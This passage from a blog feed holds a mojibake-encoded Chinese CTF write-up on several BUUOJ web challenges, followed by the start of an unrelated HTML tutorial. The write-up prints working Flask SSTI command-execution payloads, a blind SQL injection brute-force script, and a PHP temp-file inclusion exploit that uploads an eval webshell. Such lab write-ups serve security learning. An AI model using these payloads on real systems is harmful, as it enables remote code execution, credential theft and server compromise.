æ³•æˆåŠŸï¼Œå°±éœ€è¦è‡ªå·±æ‰‹åŠ¨æµ‹è¯•ï¼Œæ‰€ä»¥å¦‚ä½•æ‰‹æ’¸ä¹Ÿæ˜¯éœ€è¦æŒæ¡çš„ã€‚ å…·ä½“å¯å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œä¸œè¥¿å¾ˆå¤šä¸”æ‚ï¼Œå†™ç»™è‡ªå·±çœ‹çš„å¤§ä½¬åˆ«å–·æˆ‘ã€‚ [https: ssti-flak%e6%a1%86%e6%9e%b6 ](https: ssti-flakæ¡†æ¶ ) é¦–å…ˆç»™å‡ ä¸ªæ¯”è¾ƒé€šç”¨çš„payload ``` http: b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81 ?name="&#123;%" for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__="='catch_warnings'" %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif endfor %&#125; [![image-20220211111654284](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211111654284.png)](https: image-20220211111654284.png) [].__class__.__base__.__subclasses__() &#123;% 'catch_warnings' b c.__init__.__globals__.values() b.__class__="=" &#123;&#125;.__class__ 'eval' b.keys() &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125; < code></3_Flask></code></pre><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211111724780.png" alt="image-20220211111724780"></a></p><p>ç„¶åæˆ‘ä»¬å†è®²ä¸€è®²è‡ªå·±å¦‚ä½•æ’¸å‡ºæ¥ä¸€ä¸ªpayloadï¼Œåšæ³•å°±æ˜¯å¯»æ‰¾å¯åˆ©ç”¨çš„ç±»ã€‚</p><p>1ã€æœ‰popen()çš„ç±»</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2ã€æœ‰osæ¨¡å—çš„</p><p>socket._socketobjectï¼ˆä¸€èˆ¬åœ¨71ï¼‰ã€site._Printerç­‰æ¨¡å—</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3ã€æœ‰builtinsçš„ç±»</p><p>__ builtins __ä»£ç æ‰§è¡Œï¼ˆæœ€å¸¸ç”¨çš„æ–¹æ³•ï¼‰</p><p>warnings.catch_warningså«æœ‰,å¸¸ç”¨çš„è¿˜æœ‰email.header._ValueFormatter</p><p>__ builtins __   æ˜¯ä¸€ä¸ªåŒ…å«äº†å¤§é‡å†…ç½®å‡½æ•°çš„ä¸€ä¸ªæ¨¡å—ï¼Œæˆ‘ä»¬å¹³æ—¶ç”¨pythonçš„æ—¶å€™ä¹‹æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸€äº›å‡½æ•°æ¯”å¦‚absï¼Œmaxï¼Œå°±æ˜¯å› ä¸º__ builtins   __ è¿™ç±»æ¨¡å—åœ¨Pythonå¯åŠ¨æ—¶ä¸ºæˆ‘ä»¬å¯¼å…¥äº†ï¼Œå¯ä»¥ä½¿ç”¨dir(__ builtins __ )æ¥æŸ¥çœ‹è°ƒç”¨æ–¹æ³•çš„åˆ—è¡¨ï¼Œç„¶åå¯ä»¥å‘ç°__   builtins __ ä¸‹æœ‰evalï¼Œ__ import __ç­‰çš„å‡½æ•°ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>å¥½äº†ï¼Œæ¥ä¸‹æ¥è¿›è¡Œå®è·µã€‚</p><p>æˆ‘ä»¬æŠŠæ‰€æœ‰å­ç±»åˆ—å‡ºæ¥</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112131255.png" alt="image-20220211112131255"></a></p><p>å¥½å®¶ä¼™å‡ºæ¥äº†å¾ˆå¤šå•Šï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„å°±å¥½ï¼Œæˆ‘ä»¬ç”¨pythonè„šæœ¬è·‘ä¸€ä¸‹</p><pre><code>import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>æˆ‘ä»¬å…ˆæ¥æ‰¾ä¸‹os._wrap_close</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112532522.png" alt="image-20220211112532522"></a></p><p>å·²ç»å‡ºæ¥äº†åœ¨132ä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ªpayload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112709595.png" alt="image-20220211112709595"></a></p><p>æˆåŠŸåˆ—å‡ºæ¥äº†æ–‡ä»¶ã€‚</p><p>ç›´æ¥è¯»å–flag</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112747491.png" alt="image-20220211112747491"></a></p><p>åŒç†ï¼Œå¯ä»¥åˆ©ç”¨çš„ç±»è¿˜æœ‰å¾ˆå¤šå•Šï¼Œ</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112931751.png" alt="image-20220211112931751"></a></p><p>å°±åƒè¿™ä¸ªç±»ä¹Ÿåœ¨é‡Œé¢åŒ…å«ç€ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥åˆ©ç”¨å®ƒæ¥è·å–flagã€‚</p><p>æ–¹æ³•æœ‰å¾ˆå¤šï¼Œç†è§£åŸç†å¹¶æŒæ¡å…¶ä¸­å‡ ç§æ–¹æ³•å³å¯ã€‚</p><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402142608573.png" alt="image-20220402142608573"></p><p>è¿›å»ä»¥åç›´æ¥ç»™ä½ äº†sqlè¯­å¥ã€‚</p><p>å…ˆä¸ç®¡åˆ«çš„æ‰«ä¸€ä¸‹ç›®å½•å†è¯´</p><p>å‘ç°xxx/robots.txtæ–‡ä»¶</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143249697.png" alt="image-20220402143249697"></p><p>å†åˆ°hin.txtæŸ¥çœ‹<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143334665.png" alt="image-20220402143334665"></p><p>ç»™å‡ºäº†è¿‡æ»¤å¾—å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”è¯´çš„å¾ˆæ˜ç™½å¦‚æœå¾—åˆ°adminå¾—å¯†ç å°±å¯ä»¥å¾—åˆ°flagï¼Œä½†æ˜¯è¿™é‡Œå¾—è¿‡æ»¤æ˜¯éå¸¸ä¸¥æ ¼å¾—ã€‚</p><p>fuzzä¸€ä¸‹</p><p>å‘ç°regexpæ²¡æœ‰è¢«è¿‡æ»¤</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143542801.png" alt="image-20220402143542801"></p><p>sqlè¯­å¥æ˜¯</p><pre><code>select * from users where username = &#39;&#39; and passwd = &#39;&#39;</code></pre><p>æˆ‘ä»¬å¯ä»¥å†usernameä¸­åŠ åæ–œæ æ³¨é‡Šæ‰å•å¼•å·</p><pre><code>select * from users where username = &#39;aaa\&#39; and passwd = &#39;||/**/passwd/**/regexp/**/&quot;^a&quot;;%00&#39;</code></pre><p>å¯¹aè¿›è¡Œä¸€ä¸ªç®€å•å¾—fuzzï¼Œåˆ¤æ–­æˆåŠŸæ—¶å¾—å“åº”åŒ…</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160348046.png" alt="image-20220402160348046"></p><p>å‘ç°yï¼Œå“åº”åŒ…æ˜¯ä¸€ä¸ª302è·³è½¬ï¼Œåˆ°welcome.php</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160421355.png" alt="image-20220402160421355"></p><p>æ ¹æ®è¿™ä¸ªå°±å¯ä»¥ç¼–å†™å‡ºpayload</p><pre><code class="python">import timeimport requestsimport stringfrom urllib import parseres = &#39;&#39;url = &#39;http://494b5c51-766a-475c-b86d-320809ca2d50.node4.buuoj.cn:81/index.php&#39;string = string.digits + string.ascii_lowercase + &#39;_&#39; # çŒœæµ‹å¯†ç ç”±æ•°å­—ï¼Œå°å†™å­—æ¯å’Œä¸‹åˆ’çº¿ç»„æˆfor i in range(0, 200):    for s in string:        data = &#123;            &quot;username&quot;: &quot;sakura\\&quot;,            &quot;passwd&quot;: &quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format((res+s), parse.unquote(&#39;%00&#39;))        &#125;        response = requests.post(url, data)        print(response)        time.sleep(0.5)        if &quot;welcome&quot; in response.text:            res = res + s            print(res)        else:            continue</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130031558.png" alt="image-20220403130031558"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130154421.png" alt="image-20220403130154421"></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>è¿›å»ç›´æ¥æ˜¾ç¤ºè¿™ä¸ª</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130428719.png" alt="image-20220403130428719"></p><p>æŸ¥çœ‹æºä»£ç ï¼Œç–‘ä¼¼hashé•¿åº¦æ‰©å±•æ”»å‡»</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130441800.png" alt="image-20220403130441800"></p><p>æŠ“å–è¯·æ±‚åŒ…ï¼Œå‘ç°hashå€¼</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403131445202.png" alt="image-20220403131445202"></p><p>ç›´æ¥passä¼ ä¸€ä¸‹ï¼Œå‘ç°æç¤ºæ–‡ä»¶</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132151777.png" alt="image-20220403132151777"></p><p>å‘ç°æ–‡ä»¶åŒ…å«</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132341966.png" alt="image-20220403132341966"></p><p>æ‰«ä¸€ä¸‹ç›®å½•</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403140421790.png" alt="image-20220403140421790"></p><p>è¯»å–ä¸‹æºç </p><p>index.php</p><pre><code class="php">&lt;?phpinclude &#39;config.php&#39;;@$name=$_GET[&#39;name&#39;];@$pass=$_GET[&#39;pass&#39;];if(md5($secret.$name)===$pass)&#123;    echo &#39;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;flflflflag.php&quot;;    &lt;/script&gt;&#39;;&#125;else&#123;    setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000);    echo &quot;username/password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)===$pass --&gt;&lt;/html&gt;</code></pre><p>flflflflag.php</p><pre><code class="php">&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_Ã¥Â‡ÂºÃ©Â¢Â˜Ã¤ÂºÂº_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>config.php</p><pre><code class="php">&lt;?php$secret=&#39;%^$&amp;$#fffdflag_is_not_here_ha_ha&#39;;?&gt;</code></pre><p>dir.php</p><pre><code class="php">&lt;?phpvar_dump(scandir(&#39;/tmp&#39;));?&gt;</code></pre><p>ç”±äºä¼ªåè®®è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åˆ©ç”¨ä¼ªåè®®è¿›è¡Œå†™é©¬ï¼Œè¿™é‡Œè€ƒå¯Ÿå¾—æ˜¯phpä¸´æ—¶æ–‡ä»¶åŒ…å«</p><p>php7 segment faultç‰¹æ€§:<br>php://filter/string.strip_tags=/etc/passwd<br>phpæ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç° Segment Faultï¼Œè¿™æ ·å¦‚æœåœ¨æ­¤åŒæ—¶ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£ä¹ˆä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿å­˜åœ¨/tmpç›®å½•ï¼Œä¸ä¼šè¢«åˆ é™¤</p><p>å…·ä½“å¯å‚é˜…æ–‡ç« :<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>payload:</p><pre><code>import requestsfrom io import BytesIOurl = &#39;http://bcd936cd-a002-414f-ba12-3fabf74c16ae.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#39;payload = &quot;&lt;?php eval($_POST[&#39;x&#39;]) ?&gt;&quot;files = &#123;    &quot;file&quot;: BytesIO(payload.encode())&#125;try:    requests.post(url=url, files=files, allow_redirects=False)except:    print(&quot;false&quot;)</code></pre><p>æŸ¥çœ‹dir.phpï¼ŒæˆåŠŸå†™å…¥æ–‡ä»¶</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403144556928.png" alt="image-20220403144556928"></p><p>æ‰§è¡Œä¸€å¥è¯æœ¨é©¬ï¼Œflagåœ¨phpinfoä¸­</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145618596.png" alt="image-20220403145618596"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145643489.png" alt="image-20220403145643489"></p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150038070.png" alt="image-20220403150038070"></p><p>æ²¡æœ‰ä»€ä¹ˆå‘ç°ï¼Œå°è¯•è®¿é—®ä¸‹secret</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150107744.png" alt="image-20220403150107744"></p><p>é‚£æˆ‘å°±æŠŠsecretå½“ä½œå‚æ•°ï¼Œä¼ å…¥ä¸€ä¸ªå€¼è¯•ä¸€è¯•</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150322198.png" alt="image-20220403150322198"></p><p>å¾ˆæ˜æ˜¾ï¼Œå®ƒæŠŠæˆ‘è¾“å…¥å¾—å€¼è¿›è¡Œäº†ä¸€ä¸ªåŠ å¯†</p><p>æ²¡æœ‰ä»€ä¹ˆå‘ç°ï¼Œéšä¾¿è¾“å…¥ä¸€äº›å­—ç¬¦ä¸²ï¼Œå®ƒå°±çˆ†é”™äº†ï¼Œï¼Œï¼Œ</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150432386.png" alt="image-20220403150432386"></p><p>å¯»æ‰¾å¯åˆ©ç”¨çš„ä¿¡æ¯</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150631904.png" alt="image-20220403150631904"></p><p>æ‰¾åˆ°äº†åŠ å¯†æ–¹å¼æ˜¯RC4,å­˜åœ¨renderï¼Œåº”è¯¥æ˜¯æ¨¡æ¿æ³¨å…¥</p><p>è¿™æ˜¯ä¸€ä¸ªRC4åŠ å¯†è„šæœ¬</p><pre><code>import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):    # print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;)    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))  # æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯    # print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    # print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)    return s_boxdef rc4_excrypt(plain, box):    # print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;)    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    # print(&quot;resç”¨äºåŠ å¯†å­—ç¬¦ä¸²ï¼ŒåŠ å¯†åæ˜¯ï¼š%res&quot; %res)    cipher = &quot;&quot;.join(res)    print(&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot; %quote(cipher))    #print(&quot;åŠ å¯†åçš„è¾“å‡º(ç»è¿‡ç¼–ç ):&quot;)    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;&quot;)</code></pre><p>é¦–å…ˆåˆ—å‡ºæ‰€æœ‰å­ç±»</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151137684.png" alt="image-20220403151137684"></p><p>ä¼ ç»™secret</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151206120.png" alt="image-20220403151206120"></p><p>å¯»æ‰¾å¯åˆ©ç”¨å­ç±»</p><p>ç»™å‡ºä¸€ä¸ªè„šæœ¬</p><p>find.py</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;subprocess.Popen&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>å¯»æ‰¾warnings.catch_warningsç±»</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152312044.png" alt="image-20220403152312044"></p><p>payload</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__['__builtins__']['open']('/flag').read()&#125;&#125;</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152255110.png" alt="image-20220403152255110"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htmlå­¦ä¹ ç¬”è®°</title>
      <link href="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ç®€å•çš„HTMLé¡µé¢æ¶æ„"><a href="#ç®€å•çš„HTMLé¡µé¢æ¶æ„" class="headerlink" title="ç®€å•çš„HTMLé¡µé¢æ¶æ„"></a>ç®€å•çš„HTMLé¡µé¢æ¶æ„</h1><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;charset  ç¼–ç  gbk gbk2312 utf-8</code></pre><h1 id="HTMLå¸¸è§æ ‡ç­¾"><a href="#HTMLå¸¸è§æ ‡ç­¾" class="headerlink" title="HTMLå¸¸è§æ ‡ç­¾"></a>HTMLå¸¸è§æ ‡ç­¾</h1><h2 id="metaæ ‡ç­¾"><a href="#metaæ ‡ç­¾" class="headerlink" title="metaæ ‡ç­¾"></a>metaæ ‡ç­¾</h2><pre><code class="html">&lt;meta&gt; å…ƒç´ å¯æä¾›æœ‰å…³é¡µé¢çš„å…ƒä¿¡æ¯ï¼ˆmeta-informationï¼‰ï¼Œæ¯”å¦‚é’ˆå¯¹æœç´¢å¼•æ“å’Œæ›´æ–°é¢‘åº¦çš„æè¿°å’Œå…³é”®è¯ã€‚è®¾ç½®ç½‘ç«™å…³é”®å­—meta name=&quot;keywords&quot; content=&quot;ç½‘ç»œå®‰å…¨ï¼ŒWEBæ¸—é€ï¼Œæ•°æ®å®‰å…¨ï¼Œæ¸—é€æµ‹è¯•ï¼Œå®‰å…¨åŸ¹è®­&quot; /&gt;&lt;link&gt; æ ‡ç­¾å®šä¹‰æ–‡æ¡£ä¸å¤–éƒ¨èµ„æºçš„å…³ç³»ã€‚&lt;script&gt; å¼•å…¥jsæ–‡ä»¶æ³¨é‡Š&lt;!--è¿™æ˜¯ä¸€æ®µæ³¨é‡Šã€‚æ³¨é‡Šä¸ä¼šåœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºã€‚--&gt;&lt;p&gt;è¿™æ˜¯ä¸€æ®µæ™®é€šçš„æ®µè½ã€‚&lt;/p&gt;</code></pre><p>ç®€å•demo</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;è¿™é‡Œæ˜¯sakuraçš„åšå®¢&lt;/title&gt;        &lt;meta name=&quot;keywords&quot; content=&quot;ç½‘ç»œå®‰å…¨ï¼Œæ¸—é€æµ‹è¯•ï¼Œä»£ç å®¡è®¡&quot;/&gt;        &lt;meta name=&quot;description&quot; content=&quot;è¿™æ˜¯sakuraçš„åšå®¢ï¼Œåˆ†äº«è‡ªå·±çš„å­¦ä¹ ç»éªŒ&quot; /&gt;        &lt;meta name=&quot;author&quot; content=&quot;sakura&quot; /&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>æ•ˆæœå›¾:</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324154159328.png" alt="image-20220324154159328"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324154219201.png" alt="image-20220324154219201"></p><h2 id="æ ‡é¢˜æ ‡ç­¾"><a href="#æ ‡é¢˜æ ‡ç­¾" class="headerlink" title="æ ‡é¢˜æ ‡ç­¾"></a>æ ‡é¢˜æ ‡ç­¾</h2><pre><code class="html">ç”±å¤§åˆ°å°&lt;h1&gt;h1&lt;/h1&gt;&lt;h2&gt;h2&lt;/h2&gt;&lt;h3&gt;h3&lt;/h3&gt;&lt;h4&gt;h4&lt;/h4&gt;&lt;h5&gt;h5&lt;/h5&gt;&lt;h6&gt;6&lt;/h6&gt;&lt;/br&gt; æ¢è¡Œæ ‡ç­¾&lt;hr&gt;æ¢è¡Œçº¿æ ‡ç­¾</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324155054152.png" alt="image-20220324155054152"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324155038536.png" alt="image-20220324155038536"></p><h2 id="æ–‡æœ¬å±æ€§"><a href="#æ–‡æœ¬å±æ€§" class="headerlink" title="æ–‡æœ¬å±æ€§"></a>æ–‡æœ¬å±æ€§</h2><pre><code class="html">&lt;strong&gt;åŠ ç²—&lt;/strong&gt;&lt;b&gt;&lt;/b&gt;åŠ ç²—&lt;i&gt;&lt;/i&gt;æ–œä½“&lt;u&gt;&lt;/u&gt; ä¸‹åˆ’çº¿&lt;sup&gt;&lt;/sup&gt;ä¸Šæ ‡&lt;sub&gt;&lt;/sub&gt;ä¸‹æ ‡&lt;del&gt;&lt;/del&gt; åˆ é™¤çº¿&lt;font&gt;&lt;/font&gt; è§„å®šå­—ä½“å±æ€§    size å­—ä½“çš„å¤§å°    color å­—ä½“é¢œè‰²    ä»£ç æ ·å¼åŸæ ·è¾“å‡º&lt;pre&gt;&lt;/pre&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324163340955.png" alt="image-20220324163340955"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324162943229.png" alt="image-20220324162943229"></p><h2 id="formè¡¨å•"><a href="#formè¡¨å•" 